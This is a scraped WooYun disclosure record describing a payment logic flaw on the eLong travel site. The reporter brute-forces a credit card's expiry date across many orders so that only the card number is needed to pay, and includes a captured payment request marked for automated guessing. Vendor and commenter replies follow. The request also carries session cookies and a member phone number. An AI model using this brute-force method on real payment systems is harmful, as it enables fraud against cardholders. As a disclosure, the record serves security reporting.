{"id": 85769, "wybug_id": "wooyun-2016-0188155", "wybug_title": "艺龙旅行网严重支付漏洞（只需知道银行信用卡号即可消费）", "wybug_corp": "艺龙旅行网", "wybug_author": "Focusstart", "wybug_date": "2016-03-23 15:32", "wybug_open_date": "2016-03-24 02:22", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "漏洞已经通知厂商但是厂商忽略漏洞", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2016-03-23：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2016-03-24：\t厂商已经主动忽略漏洞，细节向公众公开  简要描述： 感谢壮丁的友情赞助，好基友，一起走。 详细说明：  首先，在艺龙随便下了一个订单，到支付页面，选择信用卡支付输入正确的卡号，有效期姓名，身份证等相关信息随便输\n\n居然支付成功了。那么问题来了说明这里只判断信用卡有效期即可成功支付接下来就简单了，我们只要尝试爆破出信用卡的有效期即可然后发现错误的有效期也能使订单到判定支付是否成功的阶段   漏洞证明：  所以。下多个订单\n\n随便点击一个订单到支付页面抓包\nPOST /epay/isajax/CreditCardExtend/Save HTTP/1.1x-requested-with: XMLHttpRequestAccept-Language: zh-cnReferer: https://secure.elong.com/epay/cn/creditcardextend/433877263696341615trainAccept: application/json, text/javascript, */*Content-Type: application/x-www-form-urlencodedAccept-Encoding: gzip, deflateUser-Agent: Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.1; Trident/5.0)Host: secure.elong.comContent-Length: 360Connection: Keep-AliveCache-Control: no-cacheCookie: SessionGuid=42ff44d5-95e9-4a84-a57b-0199c4a28a59; com.eLong.CommonService.OrderFromCookieInfo=Pkid=50&Parentid=50000&Coefficient=0.0&Status=1&Priority=8000&Makecomefrom=0&Savecookies=0&Cookiesdays=0&Isusefparam=0&Orderfromtype=1; s_cc=true; s_sq=elongcom%3D%2526pid%253Dmy.elong.com%25252Ftrain%25252Ftrainorder_cn.html%2526pidt%253D1%2526oid%253Dhttp%25253A%25252F%25252Fmy.elong.com%25252Ftrain%25252Ftrainorder_cn.html%25253Frnd%25253D20160323142748598%252523%25253F%2526ot%253DA%2526oi%253D413; CookieGuid=bf5e468c-2c0e-4e32-a174-c6b00a59600b; Esid=72832668-11ae-4cf6-8486-f2a53dda7c15; member=18075958330; Lgid=LRpRtrsC3gsExwGXhEk%2flpaR3waA7McUH7SGryL5%2fSFdUfZTcxrrKJN7gDYF38TJf%2b6813mw0I7%2bEqLpl1r2dNM00g3TNSUIsbfjUZc3xAoySWAQkZq3Hr3%2fuLPImoK3; s_visit=1; route=d99f2606f97cd9d480bdb1efdeca5346; ASP.NET_SessionId=go0f0j550ckcs055bbbdmvu1; TLTCNT=CHG-OWEBTJ10000000000077396language=cn&id=§433877263696341615train§&paymentInfo.CreditCardNumber=******&paymentInfo.Cardholder=%E6%B5%8B%E8%AF%95&paymentInfo.FirstName=&paymentInfo.MiddleName=&paymentInfo.LastName=&paymentInfo.CardValidity=§2022-1§&paymentInfo.CertificateTypeID=2&paymentInfo.CertificateNumber=321321&paymentInfo.CheckedLast4Num=false&paymentInfo.IdOfCardsHistory=\n\n\n订单+有效期爆破。隔几秒放过那么订单都会到判断支付是否成功的阶段，如果订单支付成功，说明有效期是正确的成功爆破出信用卡有效期并成功支付\n\n\n\n\n\n   修复方案：  信用卡支付逻辑是不是该有有效期+CVV码+手机验证码组成？   版权声明：转载请注明来源 Focusstart@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：无影响厂商忽略 忽略时间：2016-03-24 02:22 厂商回复： 亲爱的乌云同行及白帽子，您们好：经过我们与贵方的多次沟通和解释，此问题为有误解的错误漏洞报告。在艺龙平台上的信用卡支付过程中，不同的银行确实会要求提交不同的用户信用卡信息。有的银行自己设定只需要信用卡号和有效期就可以完成支付，而不需要其他例如验证CVV码的流程，但是后续控制措施会从用户看不到的其他方面加以弥补。有时需要额外收集身份证信息是用于和部分银行信用卡中心核对持卡人身份，是属于一个保证支付安全的内部控制加强措施。众所周知，使用假信用卡或盗用他人的信用卡信息进行支付是非常严重的违法行为，作为已经在本行业经营十多年的成熟企业，艺龙提醒广大用户妥善保管好自己的信用卡信息。艺龙已经通过了PCI DSS认证（Payment Card Industry Data Security Standard，由国际顶级信用卡公司Visa，MasterCard，JCB等联合出台的全球信用卡信息安全标准），将与银行和同业公司一起努力为广大用户提供更安全，更方便和更快捷的支付体验。作为艺龙公司，我们非常重视用户的所有安全问题，如有咨询请随时与艺龙公司联系，感谢您的大力支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n     2016-03-23 15:33 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:925 漏洞数:80        | 哈！躁起来！)\t\t \n  尼玛呀    \n     2016-03-23 15:34 |    \t\tj0k3r \t\t\t( 普通白帽子  |\t\t\t        Rank:431 漏洞数:121        | 心有猛虎，细嗅蔷薇)\t\t \n  可怕    \n     2016-03-23 15:34 |    \t\t我是壮丁  \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:1        | 专业打酱油)\t\t \n  可啪    \n     2016-03-23 15:35 |    \t\tAK-47 \t\t\t( 实习白帽子  |\t\t\t        Rank:78 漏洞数:11        | 开开心心挖洞，踏踏实实上学！)\t\t \n  这么牛叉，要火    \n     2016-03-23 15:35 |    \t\tzmx \t\t\t( 普通白帽子  |\t\t\t        Rank:123 漏洞数:32        | wooyun)\t\t \n  嘀，上墙卡    \n     2016-03-23 15:35 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1858 漏洞数:153        | 如果大海能够带走我的矮丑...)\t\t \n  好可怕    \n     2016-03-23 15:35 |    \t\tAasron \t\t\t( 普通白帽子  |\t\t\t        Rank:263 漏洞数:67        | 万万没想到)\t\t \n  首先你得先有一张信用卡    \n     2016-03-23 15:35 |    \t\tFocusstart  \t\t\t( 普通白帽子  |\t\t\t        Rank:694 漏洞数:189        | 努力让某某某成为最幸福的女人！)\t\t \n  吓得我以后都不敢用信用卡了    \n     2016-03-23 15:35 |    \t\t带馅儿馒头  \t\t\t( 核心白帽子 |\t\t\t        Rank:1325 漏洞数:150        | 心在，梦在)\t\t \n  还好我不用    \n     2016-03-23 15:36 |    \t\t狗狗侠  \t\t\t( 普通白帽子  |\t\t\t        Rank:518 漏洞数:58        | 我是狗狗侠)\t\t \n  打雷了，该出来收衣服了    \n     2016-03-23 15:36 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1667 漏洞数:252        | WooYun is the Bigest gay place.  网络工...)\t\t \n  好可怕，还好我没信用卡，    \n     2016-03-23 15:36 |    \t\t啊L川  \t\t\t( 普通白帽子  |\t\t\t        Rank:195 漏洞数:39        | 菜鸟 ，菜渣， 菜呀！)\t\t \n  可啪啪啪！    \n     2016-03-23 15:37 |    \t\t瘦蛟舞  \t\t\t( 普通白帽子  |\t\t\t        Rank:765 漏洞数:83        | 铁甲依然在)\t\t \n  屌    \n     2016-03-23 15:37 |    \t\tjust_joker \t\t\t( 实习白帽子  |\t\t\t        Rank:77 漏洞数:19        | ..........)\t\t \n  随随便便，开了一间免费的大床炮房    \n     2016-03-23 15:37 |    \t\tjs2012 \t\t\t( 实习白帽子  |\t\t\t        Rank:94 漏洞数:38        | 闭关修炼。。。)\t\t \n  66666    \n     2016-03-23 15:42 |    \t\t咕噜流氓兔 \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 专业段子手~~~！)\t\t \n  66666，开房免费了 这下    \n     2016-03-23 15:43 |    \t\tMieless \t\t\t( 实习白帽子  |\t\t\t        Rank:35 漏洞数:10        | 我是来打酱油的。)\t\t \n  滴，卡号110120119，学生卡，麻烦皇家礼炮开个房    \n     2016-03-23 15:48 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:38        | 要想Rank给高，标题一定得屌)\t\t \n  我草！    \n     2016-03-23 15:49 |    \t\tTaro \t\t\t( 普通白帽子  |\t\t\t        Rank:249 漏洞数:67        | 走向最远的方向，哪怕前路迷茫；抱着最大的...)\t\t \n  这个问题有点严重啊    \n     2016-03-23 15:50 |    \t\t木头 \t\t\t( 路人 |\t\t\t        Rank:28 漏洞数:5        | 一二三，木头人)\t\t \n  火钳占座    \n     2016-03-23 16:05 |    \t\tJutaZ \t\t\t( 实习白帽子  |\t\t\t        Rank:89 漏洞数:13        | 少壮不努力老大徒伤悲)\t\t \n  可怕    \n     2016-03-23 16:06 |    \t\tzzR  \t\t\t( 普通白帽子  |\t\t\t        Rank:1394 漏洞数:123        | 东方红＊＊联盟欢迎你－0-)\t\t \n  我最近想去个北欧地极10日游，不知道sky大金表的卡能不能扛得住    \n     2016-03-23 16:08 |    \t\talso \t\t\t( 普通白帽子  |\t\t\t        Rank:434 漏洞数:53        | 招渗透/php/前端/ios&android安全，广州)\t\t \n  是否跟上次携程那个一样？    \n     2016-03-23 16:10 |    \t\t皮卡丘♪～(´ε｀　) \t\t\t( 路人 |\t\t\t        Rank:2 漏洞数:1        | 我是小号啊)\t\t \n  总统套房，先开100年，谢谢    \n     2016-03-23 16:12 |    \t\tWhysec \t\t\t( 路人 |\t\t\t        Rank:20 漏洞数:8        )\t\t \n  还好我办不起信用卡    \n     2016-03-23 16:15 |    \t\thh2014 \t\t\t( 普通白帽子  |\t\t\t        Rank:818 漏洞数:202        | Rank:1000 漏洞数：240|目标RANK 1200)\t\t \n  666    \n     2016-03-23 16:16 |    \t\t红客十年 \t\t\t( 普通白帽子  |\t\t\t        Rank:392 漏洞数:80        | 去年离职富士康，回到家中上蓝翔，蓝翔毕业...)\t\t \n  幸好我不用信用卡    \n     2016-03-23 16:18 |    \t\tFormat_smile \t\t\t( 普通白帽子  |\t\t\t        Rank:377 漏洞数:143        | ···孰能无过，谁是谁非！)\t\t \n  简直阔怕啊    \n     2016-03-23 16:18 |    \t\tArcticWolf \t\t\t( 路人 |\t\t\t        Rank:17 漏洞数:10        | #每#天#提#交#一#个#洞#)\t\t \n  看到上面清一色核心，，来沾沾挖洞的灵气    \n     2016-03-23 16:19 |    \t\tzsmj \t\t\t( 普通白帽子  |\t\t\t        Rank:164 漏洞数:25        | 蛛丝马迹！)\t\t \n  可 啪    \n     2016-03-23 16:21 |    \t\t江苏苏宁易购电子商务有限公司(乌云厂商)\t\t \n  没有信用卡的路过    \n     2016-03-23 16:22 |    \t\t齐迹 \t\t\t( 普通白帽子  |\t\t\t        Rank:802 漏洞数:104        | 重庆地区招聘安全工程师。sec.zbj.com欢迎...)\t\t \n  这是怎么做到的？？难道银行接口还没限制啊？    \n     2016-03-23 16:23 |    \t\t幻老头儿 \t\t\t( 普通白帽子  |\t\t\t        Rank:236 漏洞数:50        | 新手上路。)\t\t \n  密码在数据库中了吧？    \n     2016-03-23 16:30 |    \t\t路人毛 \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:38        | 要想Rank给高，标题一定得屌)\t\t \n  @江苏苏宁易购电子商务有限公司 苏宁，发我几张神秘代码卡，如何？    \n     2016-03-23 16:34 |    \t\tD_in \t\t\t( 普通白帽子  |\t\t\t        Rank:423 漏洞数:65        | 到我嘴里来)\t\t \n  要火    \n     2016-03-23 16:36 |    \t\t小胖子  \t\t\t( 核心白帽子 |\t\t\t        Rank:1858 漏洞数:153        | 如果大海能够带走我的矮丑...)\t\t \n  滴，穴深卡~    \n     2016-03-23 16:38 |    \t\t_Thorns \t\t\t( 普通白帽子  |\t\t\t        Rank:1667 漏洞数:252        | WooYun is the Bigest gay place.  网络工...)\t\t \n  前排占座，哈哈哈。    \n     2016-03-23 16:39 |    \t\t毕月乌 \t\t\t( 普通白帽子  |\t\t\t        Rank:120 漏洞数:16        | 猜猜我是谁？)\t\t \n  卧槽！前排围观！    \n     2016-03-23 16:40 |    \t\tloli  \t\t\t( 普通白帽子  |\t\t\t        Rank:649 漏洞数:59        | 每个男人心中都住着一个叫小红的88号技师。)\t\t \n  请警察叔叔密切关注此人去向。    \n     2016-03-23 16:41 |    \t\txiaoxiaoleo \t\t\t( 实习白帽子  |\t\t\t        Rank:51 漏洞数:15        | xx.oo)\t\t \n  http://tech.qq.com/a/20140327/005032.htm     \n     2016-03-23 16:48 |    \t\t大师兄 \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:8        | 每日必关注乌云)\t\t \n  啊！啊！~    \n     2016-03-23 16:50 |    \t\t白非白  \t\t\t( 普通白帽子  |\t\t\t        Rank:465 漏洞数:65        | ♫ Freedom - Anthony Hamilton ♫)\t\t \n  滴，涝粘卡~    \n     2016-03-23 16:55 |    \t\tsecart \t\t\t( 实习白帽子  |\t\t\t        Rank:31 漏洞数:7        | 这个人很懒，什么都没留。)\t\t \n  我带着你,你带着信用卡,我们一起去旅行吧~~~~    \n     2016-03-23 16:56 |    \t\tBrother \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:15        | 从小有个英雄梦！)\t\t \n  事实证明了一些问题现象！老百姓路过～咱是无辜的！$$$不见了！哦    \n     2016-03-23 16:58 |    \t\t浩天  \t\t\t( 普通白帽子  |\t\t\t        Rank:925 漏洞数:80        | 哈！躁起来！)\t\t \n  多个银行都行，好变态的构造    \n     2016-03-23 17:23 |    \t\tprolog \t\t\t( 普通白帽子  |\t\t\t        Rank:598 漏洞数:113        | Rank:8888 漏洞数:1024 | 低调求发展)\t\t \n  $$$不见了！哦    \n     2016-03-23 17:36 |    \t\tVinc \t\t\t( 普通白帽子  |\t\t\t        Rank:124 漏洞数:23        | :))\t\t \n  .    \n     2016-03-23 17:37 |    \t\t百度谷歌bing狗一下 \t\t\t( 路人 |\t\t\t        Rank:21 漏洞数:4        | 学到老活到老!)\t\t \n  为什么没人发CCAV看这里了...    \n     2016-03-23 17:38 |    \t\t闰土。 \t\t\t( 路人 |\t\t\t        Rank:6 漏洞数:3        | 做自己的英雄 - rainto .)\t\t \n  害怕~ ，高清重置。    \n     2016-03-23 17:51 |    \t\t小豹 \t\t\t( 实习白帽子  |\t\t\t        Rank:57 漏洞数:10        | 没有不老的誓言，没有不变的承诺，踏上旅途...)\t\t \n  吓得我，把钱取完了    \n     2016-03-23 17:58 |    \t\tANS5 \t\t\t( 普通白帽子  |\t\t\t        Rank:218 漏洞数:69        | 爱生活，爱挖洞，更爱妹纸。)\t\t \n  卧槽，要火！    \n     2016-03-23 18:23 |    \t\t苏安泽 \t\t\t( 普通白帽子  |\t\t\t        Rank:136 漏洞数:37        | 一个想成为演员的黑客~)\t\t \n  我收到我的银行卡消费信息，吓到我赶紧骑单车去银行查。结果...发现我卡里的5毛钱还在，真是吓死人了！    \n     2016-03-23 18:29 |    \t\tCan \t\t\t( 实习白帽子  |\t\t\t        Rank:98 漏洞数:28        | 天地不仁 以万物为刍狗)\t\t \n  叼叼叼    \n     2016-03-23 18:38 |    \t\tby黑桃 \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:8        | 走到技术的顶端，不是天才，而是疯子)\t\t \n  把这些人全部给我带走    \n     2016-03-23 18:53 |    \t\t我是你的益达！ \t\t\t( 实习白帽子  |\t\t\t        Rank:34 漏洞数:7        | 容我喝壹杯捌贰年的雪碧压压精！！)\t\t \n  ........    \n     2016-03-23 19:10 |    \t\t表哥 \t\t\t( 实习白帽子  |\t\t\t        Rank:42 漏洞数:11        | 他依然帅气。)\t\t \n  我收到我的银行卡消费信息，吓到我赶紧骑单车去银行查。结果...发现我卡里的5毛钱还在，真是吓死人了！额，我车呢    \n     2016-03-23 19:18 |    \t\tRona \t\t\t( 实习白帽子  |\t\t\t        Rank:88 漏洞数:23        | test)\t\t \n  看标题就大概知道了，信用卡号+信用卡有效期完成支付？这个应该是银行本身的问题，做过信用卡支付的都知道。这是银行的问题，跟具体使用公司没有太大关系。你们这些穷屌果断退散。    \n     2016-03-23 19:23 |    \t\t黑云 \t\t\t( 路人 |\t\t\t        Rank:12 漏洞数:3        | 米有)\t\t \n  只是需要知道卡号就可以支付吗？不会这么简单吧？    \n     2016-03-23 19:28 |    \t\tBrother \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:15        | 从小有个英雄梦！)\t\t \n  怎么多人留言，咱们唯一目地就是提醒各位厂商！一个小细节可能给客户带来财产威胁（责任还是厂商）如果属实！各位厂商引以为戒！（乌云路人甲个人个人观点）    \n     2016-03-23 19:39 |    \t\tHackshy \t\t\t( 实习白帽子  |\t\t\t        Rank:47 漏洞数:23        | XXXXXXXXXXXX)\t\t \n  ..!!!!!!!!!!!!... 说得好像你们能看得到似的。    \n     2016-03-23 19:42 |    \t\tBrother \t\t\t( 实习白帽子  |\t\t\t        Rank:50 漏洞数:15        | 从小有个英雄梦！)\t\t \n  !!!!!打雷了！又是敏感标题！咱们看不到！但是可以想象！哈    \n     2016-03-23 19:43 |    \t\tautO_pw \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 我们的征途是星辰大海。)\t\t \n  吓得我马上把银行卡剪烂丢进厕所冲走了    \n     2016-03-23 19:44 |    \t\tloopx9  \t\t\t( 普通白帽子  |\t\t\t        Rank:773 漏洞数:78        | ..)\t\t \n  啪啪啪！    \n     2016-03-23 19:53 |    \t\t诚殷的小白帽 \t\t\t( 实习白帽子  |\t\t\t        Rank:56 漏洞数:29        )\t\t \n  papapap    \n     2016-03-23 20:02 |    \t\tAAA \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 战五渣~)\t\t \n  这应该是CNP吧！这应该是CNP吧！这应该是CNP吧！携程早就在用了，去年还有人报过。    \n     2016-03-23 20:04 |    \t\twebhe4d \t\t\t( 实习白帽子  |\t\t\t        Rank:44 漏洞数:18        | 沉浸代码，学审计！！！)\t\t \n  可以可以。    \n     2016-03-23 20:19 |    \t\tAAA \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:2        | 战五渣~)\t\t \n  @江苏苏宁易购电子商务有限公司     \n     2016-03-23 21:05 |    \t\t泪雨无魂 \t\t\t( 普通白帽子  |\t\t\t        Rank:240 漏洞数:62        | too young too simple)\t\t \n  好可怕    \n     2016-03-23 21:35 |    \t\t雅柏菲卡 \t\t\t( 普通白帽子  |\t\t\t        Rank:1275 漏洞数:253        | 雙魚座聖鬥士雅柏菲卡)\t\t \n  @江苏苏宁易购电子商务有限公司 同路过    \n     2016-03-23 21:45 |    \t\tqhwlpg \t\t\t( 普通白帽子  |\t\t\t        Rank:260 漏洞数:63        | 潜心代码审计。)\t\t \n  @江苏苏宁易购电子商务有限公司 喜闻乐见    \n     2016-03-23 21:59 |    \t\t盛大在线(乌云厂商)\t\t \n  人艰不拆    \n     2016-03-23 22:01 |    \t\ts3xy \t\t\t( 核心白帽子 |\t\t\t        Rank:942 漏洞数:125        | 相濡以沫，不如相忘于江湖)\t\t \n  马克    \n     2016-03-23 22:18 |    \t\tCheery \t\t\t( 路人 |\t\t\t        Rank:26 漏洞数:5        | 0.0)\t\t \n  老司机 带带我！！！    \n     2016-03-23 22:26 |    \t\t暴走 \t\t\t( 普通白帽子  |\t\t\t        Rank:552 漏洞数:101        | Wooyun的Rank获取如同Dota冲天梯有过之而无...)\t\t \n  可以黑产！    \n     2016-03-23 22:39 |    \t\tucifer \t\t\t( 普通白帽子  |\t\t\t        Rank:226 漏洞数:71        | 萌萌哒~)\t\t \n  卧槽，吓得我都把艺龙给注销账号了    \n     2016-03-24 00:44 |    \t\t泛海扬帆 \t\t\t( 路人 |\t\t\t        Rank:4 漏洞数:3        | 广告位招商 Tel:136xxxxxxxx)\t\t \n  袍哥威武    \n  \n\n\n", "wybug_level_fromcorp": "无影响厂商忽略", "wybug_rank_fromcorp": 0, "Ranks": null}